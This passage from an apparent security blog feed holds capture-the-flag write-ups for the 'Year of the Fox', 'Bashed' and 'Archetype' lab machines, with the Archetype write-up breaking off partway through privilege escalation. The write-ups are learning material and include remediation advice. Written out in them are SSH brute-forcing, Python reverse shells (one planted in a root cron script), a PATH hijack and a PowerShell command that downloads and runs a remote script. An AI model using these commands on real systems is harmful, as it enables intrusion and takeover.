<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_thm_yotf/screenshot08a.png.webp" />  </p>
<p>2. We get a shell with <code>www-data</code> privileges and use it to probe further. From the listing of open ports, we find that the ssh port <code>22/tcp</code> is open and accepting connection only on the localhost interface. We can use <code>socat</code> to tunnel this port to probe it from our attacking system:  </p>
<pre><code>socat tcp-listen:1337,reuseaddr,fork tcp:localhost:22
</code></pre>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_thm_yotf/screenshot09.png.webp" />  </p>
<p>3. With this, we now have tunneled <code>localhost:22</code> to <code>10.10.41.240:1337</code> and can now run a ssh password bruteforce for user <code>fox</code> on it. After a few minutes we find a hit and can now login:  </p>
<pre><code>hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.41.240:1337
ssh fox@10.10.41.240 -p1337
</code></pre>
<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_thm_yotf/screenshot10.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.3.2" src="/static/files/posts_thm_yotf/screenshot11.png.webp" />  </p>
<p>4. We find the second flag file <code>/home/fox/user-flag.txt</code>:  </p>
<p><img alt="writeup.exploitation.steps.4.1" src="/static/files/posts_thm_yotf/screenshot12.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>www-data@year-of-the-fox&gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@year-of-the-fox&gt;  
www-data@year-of-the-fox&gt; uname
Linux year-of-the-fox 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
www-data@year-of-the-fox&gt;  
www-data@year-of-the-fox&gt; ifconfig
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 9001
  inet 10.10.41.240  netmask 255.255.0.0  broadcast 10.10.255.255
  inet6 fe80::12:4bff:fe54:f2e0  prefixlen 64  scopeid 0x20&lt;link&gt;
  ether 02:12:4b:54:f2:e0  txqueuelen 1000  (Ethernet)
  RX packets 76192  bytes 8543685 (8.5 MB)
  RX errors 0  dropped 0  overruns 0  frame 0
  TX packets 72416  bytes 14679085 (14.6 MB)
  TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
  inet 127.0.0.1  netmask 255.0.0.0
  inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
  loop  txqueuelen 1000  (Local Loopback)
  RX packets 6896  bytes 489426 (489.4 KB)
  RX errors 0  dropped 0  overruns 0  frame 0
  TX packets 6896  bytes 489426 (489.4 KB)
  TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
www-data@year-of-the-fox&gt;  
www-data@year-of-the-fox&gt; users
rascal
fox
root
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. We find that we can execute the <code>/usr/sbin/shutdown</code> file with <code>sudo</code>. Since the target machine doesn't have <code>strings</code> installed, we transfer this file to our attacking machine and investigate further. We find a reference to the <code>poweroff</code> binary name, which when combined with the fact that <code>secure_path</code> is not defined within <code>/etc/sudoers</code> (seen in <code>sudo -l</code> output), hint that a environment path modification vector could help us escalate privileges:  </p>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_thm_yotf/screenshot13.png.webp" />  </p>
<p>2. We copy bash to the local directory, rename it to <code>poweroff</code> and modify the <code>PATH</code> environment variable to search for file within current directory first. With this change, we then execute <code>shutdown</code> file and get elevated privileges:  </p>
<pre><code>cp /bin/bash ./
mv ./bash poweroff
ls -la poweroff /bin/bash
md5sum poweroff /bin/bash
sudo /usr/sbin/shutdown
</code></pre>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_thm_yotf/screenshot14.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_thm_yotf/screenshot15.png.webp" />  </p>
<p>3. We see the third flag file <code>root.txt</code> but it turns out to be placeholder. After some searching, we find the actual root flag file <code>.did-you-think-I-was-useless.root</code>, hidden within user <code>rascal</code>'s home directory:  </p>
<pre><code>cat /home/rascal/.did-you-think-I-was-useless.root
</code></pre>
<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_thm_yotf/screenshot16.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_thm_yotf/screenshot17.png.webp" />  </p>
<h2>Learning/Recommendation</h2>
<ul>
<li>The webapp exposed a search field which was vulnerable to command injection. This allowed the attacker to gain interactive access of the target machine. It is advised to follow a secure development lifecycle for critical production web applications.</li>
<li>The <code>shutdown</code> binary was vulnerable to a path expansion attack which allowed the attacker to gain elevated privileges.</li>
</ul>
<h2>Loot</h2>
<h3>Credentials</h3>
<pre><code>ssh: fox/1234...
webapp: rascal/l...
</code></pre>
<h3>Flags</h3>
<pre><code>/var/www/web-flag.txt: THM{Nzg2ZWQwYWUwN2UwOTU3N............
/home/fox/user-flag.txt: THM{Njg3NWZhNDBjMmNlMzNkM............
/home/rascal/.did-you-think-I-was-useless.root: THM{ODM3NTdkMDljYmM4.................
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://tryhackme.com/room/yotf">https://tryhackme.com/room/yotf</a>  </li>
<li><a href="https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/">https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/</a>  </li>
<li><a href="https://www.cybergoat.co.uk/writeup/Year-of-Fox-TryHackMe/">https://www.cybergoat.co.uk/writeup/Year-of-Fox-TryHackMe/</a>  </li>
<li><a href="https://blog.tryhackme.com/year-of-the-fox-official-write-up/">https://blog.tryhackme.com/year-of-the-fox-official-write-up/</a>  </li>
</ul>]]></description>
      <category>tryhackme</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Bashed</title>
      <link>https://7h3ram.github.io/posts/20200625_htb-bashed.html</link>
      <guid>https://7h3ram.github.io/posts/20200625_htb-bashed.html</guid>
      <pubDate>Thu, 25 Jun 2020 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/118">Bashed</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_bashed/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_bashed/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>80/tcp/http/2.4.18 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_python_reverseshell">exploit_python_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudo">privesc_sudo</a>, <a href="https://github.com/7h3rAm/writeups#privesc_cron_rootjobs">privesc_cron_rootjobs</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.80 scan initiated Fri May 29 19:04:11 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/writeups/htb.bashed/results/10.10.10.68/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/writeups/htb.bashed/results/10.10.10.68/scans/xml/_quick_tcp_nmap.xml 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up, received user-set (0.32s latency).
Scanned at 2020-05-29 19:04:24 IST for 46s
Not shown: 999 closed ports
Reason: 999 conn-refused
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 29 19:05:10 2020 -- 1 IP address (1 host up) scanned in 59.85 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_bashed/openports.png.webp" />  </p>
<p>3. We see that the port <code>80/tcp</code> is the only open port on this machine. Let's run <code>gobuster</code> and find interesting directories on this web server:  </p>
<pre><code>gobuster dir -u http://10.10.10.68:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,asp,aspx,jsp&quot; -z -o &quot;/home/kali/toolbox/writeups/htb.bashed/results/10.10.10.68/scans/tcp_80_http_gobuster_dirbuster.txt&quot;
</code></pre>
<p>4. We find a few directories from <code>gobuster</code> scan and the <code>/dev</code> directory lists two interesting files: <code>phpbash.min.php</code> and <code>phpbash.php</code>  </p>
<pre><code>$ cat results/10.10.10.68/scans/tcp_80_http_gobuster_dirbuster.txt 
  http://10.10.10.68:80/images (Status: 301) [Size: 311]
  http://10.10.10.68:80/index.html (Status: 200) [Size: 7742]
  http://10.10.10.68:80/about.html (Status: 200) [Size: 8190]
  http://10.10.10.68:80/contact.html (Status: 200) [Size: 7802]
  http://10.10.10.68:80/uploads (Status: 301) [Size: 312]
  http://10.10.10.68:80/php (Status: 301) [Size: 308]
  http://10.10.10.68:80/css (Status: 301) [Size: 308]
  http://10.10.10.68:80/dev (Status: 301) [Size: 308]
  http://10.10.10.68:80/js (Status: 301) [Size: 307]
  http://10.10.10.68:80/config.php (Status: 200) [Size: 0]
  http://10.10.10.68:80/fonts (Status: 301) [Size: 310]
  http://10.10.10.68:80/single.html (Status: 200) [Size: 7476]
</code></pre>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_bashed/screenshot03.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_htb_bashed/screenshot01.png.webp" />  </p>
<p>5. We find that <a href="https://github.com/Arrexel/phpbash"><code>phpbash</code></a> is a minimal web shell that can give us interactive access to the target machine.  </p>
<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_htb_bashed/screenshot02.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>80/tcp  | http      | 2.4.18 ((Ubuntu))
</code></pre>
<h4>Files</h4>
<pre><code>/dev/phpbash.min.php
/dev/phpbash.php
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We visit the <code>/dev/phpbash.min.php</code> page and find the <code>phpbash</code> interactive web shell UI which enables command execution and further enumeration:  </p>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_bashed/screenshot05.png.webp" />  </p>
<p>2. We use a Python reverse shell to obtain interactive access on this system:  </p>
<pre><code>nc -nlvp 443
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_bashed/screenshot06.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>www-data@bashed&gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bashed&gt;  
www-data@bashed&gt; uname
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
www-data@bashed&gt;  
www-data@bashed&gt; ifconfig
ens33   Link encap:Ethernet  HWaddr 00:50:56:b9:44:62  
        inet addr:10.10.10.68  Bcast:10.10.10.255  Mask:255.255.255.255
        inet6 addr: dead:beef::250:56ff:feb9:4462/64 Scope:Global
        inet6 addr: fe80::250:56ff:feb9:4462/64 Scope:Link
        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
        RX packets:83524 errors:0 dropped:332 overruns:0 frame:0
        TX packets:78785 errors:0 dropped:0 overruns:0 carrier:0
        collisions:0 txqueuelen:1000 
        RX bytes:5305396 (5.3 MB)  TX bytes:8408691 (8.4 MB)

lo      Link encap:Local Loopback  
        inet addr:127.0.0.1  Mask:255.0.0.0
        inet6 addr: ::1/128 Scope:Host
        UP LOOPBACK RUNNING  MTU:65536  Metric:1
        RX packets:444689 errors:0 dropped:0 overruns:0 frame:0
        TX packets:444689 errors:0 dropped:0 overruns:0 carrier:0
        collisions:0 txqueuelen:1 
        RX bytes:32908196 (32.9 MB)  TX bytes:32908196 (32.9 MB)
www-data@bashed&gt;  
www-data@bashed&gt; users
root
arrexel
scriptmanager
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. We find that the user <code>www-data</code> can run any command as user <code>scriptmanager</code> using <code>sudo</code>:  </p>
<pre><code>sudo -l
sudo -u scriptmanager /bin/bash
</code></pre>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_bashed/screenshot07.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_htb_bashed/screenshot10.png.webp" />  </p>
<p>2. We find an interesting directory <code>/scripts</code> which has two files in it. One is a Python script <code>test.py</code> owned by user <code>scriptmanager</code> and other is <code>test.txt</code> owned by <code>root</code>. We use a script <code>CronJobCheckser.sh</code> and find that there's a <code>root</code> owned cronjob that runs the <code>test.py</code> script and which creates the <code>test.txt</code> file.  </p>
<pre><code>ls -la /scripts
cat /scripts/test.py
</code></pre>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_bashed/screenshot08.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_htb_bashed/screenshot09.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_htb_bashed/screenshot11.png.webp" />  </p>
<p>3. We can now edit this file to execute a reverse shell that gives us elevated privileges on the system:  </p>
<pre><code>nc -nlvp 9999
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &gt;&gt;/scripts/test.py
</code></pre>
<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_bashed/screenshot12.png.webp" />  </p>
<p>4. As soon as the cronjob runs, we get the elevated shell and can now view the <code>root.txt</code> flag file:  </p>
<pre><code>cat /root/root.txt
</code></pre>
<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_htb_bashed/screenshot13.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_htb_bashed/screenshot14.png.webp" />  </p>
<h2>Learning/Recommendation</h2>
<ul>
<li>Production web server instances should not host developement tools like a PHP web shell. It allowed the attacker to gain interactive access of the target system.</li>
<li>Service users should not be allowed to use <code>sudo</code>. This misconfiguration enabled attacker to switch to a more privileged user account.</li>
<li>Cronjob files should be owned by the same user that will be allowed to run it. The attacker was able to use this misconfiguration to modify a file they own and get it executed by <code>root</code> user.</li>
</ul>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>arrexel:$1$mDpVXKQV$o6HkBjhl/e.S.bV96tMm6.:17504:............
scriptmanager:$6$WahhM57B$rOHkWDRQpds96uWXkRCzA6b5L3wOorpe4uwn5U32yKRsMWDwKAm.RF6T81Ki/MOyo.dJ0B8Xm5/wOrLk.........................
</code></pre>
<h3>Flags</h3>
<pre><code>/home/arrexel/user.txt: 2c281f318555dbc1b8569...........
/root/root.txt: cc4f0afe3a1026d402ba10..........
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/118">https://www.hackthebox.eu/home/machines/profile/118</a>  </li>
<li><a href="https://medium.com/@ranakhalil101/hack-the-box-bashed-writup-a8e51a2914c2">https://medium.com/@ranakhalil101/hack-the-box-bashed-writup-a8e51a2914c2</a>  </li>
<li><a href="https://0xdf.gitlab.io/2018/04/29/htb-bashed.html">https://0xdf.gitlab.io/2018/04/29/htb-bashed.html</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Archetype</title>
      <link>https://7h3ram.github.io/posts/20200428_htb-archetype.html</link>
      <guid>https://7h3ram.github.io/posts/20200428_htb-archetype.html</guid>
      <pubDate>Tue, 28 Apr 2020 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p><img alt="writeup.metadata.infocard" src="/static/files/posts_htb_archetype/infocard.png.webp" /></p>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/start">Archetype</a>.</p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_bashed/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>445/tcp/microsoft-ds/Windows Server 2019 Standard 17763 microsoft-ds</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_smb">enumerate_proto_smb</a>, <a href="https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access">enumerate_proto_smb_anonymous_access</a>, <a href="https://github.com/7h3rAm/writeups#privesc_psexec_login">privesc_psexec_login</a><br />
2. <code>1433/tcp/ms-sql-s/Microsoft SQL Server 14.00.1000.00</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_sql">enumerate_proto_sql</a>, <a href="https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig">enumerate_proto_sql_ssis_dtsconfig</a>, <a href="https://github.com/7h3rAm/writeups#enumerate_app_powershell_history">enumerate_app_powershell_history</a>, <a href="https://github.com/7h3rAm/writeups#exploit_sql_login">exploit_sql_login</a>, <a href="https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell">exploit_sql_xpcmdshell</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Tue Apr 28 07:55:10 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.archetype/results/10.10.10.27/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.archetype/results/10.10.10.27/scans/xml/_quick_tcp_nmap.xml 10.10.10.27
Increasing send delay for 10.10.10.27 from 0 to 5 due to 32 out of 106 dropped probes since last increase.
Nmap scan report for 10.10.10.27
Host is up, received user-set (0.29s latency).
Scanned at 2020-04-28 07:55:24 PDT for 59s
Not shown: 996 closed ports
Reason: 996 resets
PORT     STATE SERVICE      REASON          VERSION
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server  14.00.1000.00
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-28T07:32:15
| Not valid after:  2050-04-28T07:32:15
| MD5:   1991 9c41 53a0 c167 df32 b67b 61b8 1d29
| SHA-1: 0e4e f065 a8c7 acbc 908f ee2e c308 1d69 b40f 5685
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQcwBdrws1MrBBCZkTyH2PuzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjAwNDI4MDczMjE1WhgPMjA1MDA0MjgwNzMyMTVaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALSwuifA
| DN4ACMe7B70oBUbpTthzMerRWg72fCSLmJWqgVrfwqBd/jlqvF2ytwrydVvp0i0b
| bBzYnwOqVj2CpEoQCbN2VZPATo1tv6dSbht4BKHdLDQOyLcflcdg+Fl1W4XCPf7w
| b4kMSWQHrr/paE388hh+yW1jyohBGB93tAHRBRFRS0D6u7DcgZxbznvYPf4a4mZN
| P45cLa3FGTR3Oc6hHCjqKlW4L1P3IjTPfFeUIuW1/3PQHn7ox/1STvIERh/Pfy3X
| fkZ4Z5Mar8nxjqlIOnmv6AnXDt4mtnfTzIA+MAZQ3x7hO8iX73V83m8pCMZR90nB
| /uDq4ln4HctzarkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAEj8vggUbVWKJOPG2
| nUHJ9T5umrpswOmmKk+S/cKY3BGqTL1ChttzWytF23SR53iIwFrYLXbApKCE8c8b
| T3zcI6YNsOgqm/HOlFNKIaQNeEnVCAMLcugLnca4QeL00ZAHTgmpaUU1V498fw7h
| HV1/EOTi2+gt+6QUmNanH0g18Bh0hWX8wwEI1zervPrFUlOzrczT6GJy/D4RiAKg
| iW26m2V+Iteo3syOlUQKSCcYsG3+Pwnx1j3SYL4tn68xwR9Jj+cfig/dT3oR1DJN
| 3s57f0jimwBlIbod2HEdQDpxuijqYszpjTjqnWCvIT3YZip/OLa/12PyU0zwnQE8
| /R2Bwg==
|_-----END CERTIFICATE-----
|_ssl-date: 2020-04-28T15:10:19+00:00; +14m11s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h38m11s, deviation: 3h07m50s, median: 14m11s
| ms-sql-info:
|   10.10.10.27:1433:
|     Version:
|       name: Microsoft SQL Server
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server
|_    TCP port: 1433
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 53066/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 9662/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45578/udp): CLEAN (Timeout)
|   Check 4 (port 47960/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-04-28T08:10:20-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-04-28 08:10:22
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 28 07:56:23 2020 -- 1 IP address (1 host up) scanned in 73.83 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_archetype/openports.png.webp" />  </p>
<p>3. We find <code>445/tcp</code> to be open and can use <code>smbclient</code> to check if it allows anonymous access:  </p>
<pre><code>smbclient -N -L \\\\10.10.10.27
</code></pre>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_archetype/screenshot01.png.webp" />  </p>
<p>4. We find a non-default share named <code>backups</code> which seems interesting. Let's explore further:  </p>
<pre><code>smbclient -N \\\\10.10.10.27\\backups
</code></pre>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_archetype/screenshot02.png.webp" />  </p>
<p>5. We find a <code>prod.dtsConfig</code> file on the SMB share. The <code>.dtsConfig</code> files are used by <a href="https://en.wikipedia.org/wiki/SQL_Server_Integration_Services">SQL Server Integration Services (SSIS)</a>. We find that this file contains plaintext credentials for the default SQL service user:  </p>
<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_htb_archetype/screenshot03.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>135/tcp    msrpc         Microsoft Windows RPC
139/tcp    netbios-ssn   Microsoft Windows netbios-ssn
445/tcp    microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp   ms-sql-s      Microsoft SQL Server 14.00.1000.00
5985/tcp   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp  msrpc         Microsoft Windows RPC
49665/tcp  msrpc         Microsoft Windows RPC
49666/tcp  msrpc         Microsoft Windows RPC
49667/tcp  msrpc         Microsoft Windows RPC
49668/tcp  msrpc         Microsoft Windows RPC
49669/tcp  msrpc         Microsoft Windows RPC
</code></pre>
<h4>Files</h4>
<pre><code>prod.dtsConfig
</code></pre>
<h4>Users</h4>
<pre><code>sql: sql_svc
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. Since the <code>1443/tcp</code> port is open for SQL service and we also have credentials for the default user, let's connect to the remote service and explore further:  </p>
<pre><code>mssqlclient.py -windows-auth &quot;sql_svc@10.10.10.27&quot;
</code></pre>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_archetype/screenshot04.png.webp" />  </p>
<p>2. We find that the user has <code>sysadmin</code> access (highest access level on SQL server) using the <code>IS_SRVROLEMEMBER</code> function. This allows us to enable <code>xp_cmdshell</code> to gain command execution:  </p>
<pre><code>SELECT IS_SRVROLEMEMBER('sysadmin')

EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
</code></pre>
<p>3. Let's run the <code>whoami</code> command using the <code>xp_cmdshell</code> method and check our current privileges. We find that our current user <code>sql_svc</code> lacks <code>Administrator</code> access on the system:  </p>
<pre><code>xp_cmdshell &quot;whoami&quot;
</code></pre>
<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_htb_archetype/screenshot05.png.webp" />  </p>
<p>4. Let's deploy a Powershell reverse shell on the system using <code>xp_cmdshell</code> to gain interactive access on the system:  </p>
<pre><code>type shell.ps1
  xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.14.33/shell.ps1\&quot;);&quot;
python3 -m http.server 80
ufw allow from 10.10.10.27 proto tcp to any port 80,443
nc -nlvp 443
</code></pre>
<p><img alt="writeup.exploitation.steps.4.1" src="/static/files/posts_htb_archetype/screenshot06.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.4.2" src="/static/files/posts_htb_archetype/screenshot07.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.4.3" src="/static/files/posts_htb_archetype/screenshot08.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.4.4" src="/static/files/posts_htb_archetype/screenshot09.png.webp" />  </p>
<p>5. We can now read the <code>user.txt</code> flag:  </p>
<pre><code>type C:\Users\sql_svc\Desktop\user.txt
</code></pre>
<p><img alt="writeup.exploitation.steps.5.1" src="/static/files/posts_htb_archetype/screenshot10.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>sql_svc@ARCHETYPE&gt; id
archetype\sql_svc
sql_svc@ARCHETYPE&gt;  
sql_svc@ARCHETYPE&gt; uname
Host Name:                 ARCHETYPE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
sql_svc@ARCHETYPE&gt;  
sql_svc@ARCHETYPE&gt; ifconfig
Ethernet adapter Ethernet0 2:
   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::f1b0:217c:824d:11d2
   Link-local IPv6 Address . . . . . : fe80::f1b0:217c:824d:11d2%7
   IPv4 Address. . . . . . . . . . . : 10.10.10.27
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:339d%7
                                       10.10.10.2
sql_svc@ARCHETYPE&gt;  
sql_svc@ARCHETYPE&gt; users
sql_svc
Administrator
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. With our interactive shell running, we can now begin exploring the system further. Since the current user is a normal as well as service account, let's look at the Powershell history file to find any interesting commands:  </p>
<pre><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
</code></pre>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_archetype/screenshot11.png.webp" />  </p>
<p>2. We find that the <code>backups</code> drive has been mounted using administrative privileges and the credentials are leaked in plaintext within the history file. We can use these credentials to gain elevated access on the system:  </p>
<pre><code>psexec.py administrator@10.10.10.27
</code></pre>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_archetype/screenshot12.png.webp" />  </p>
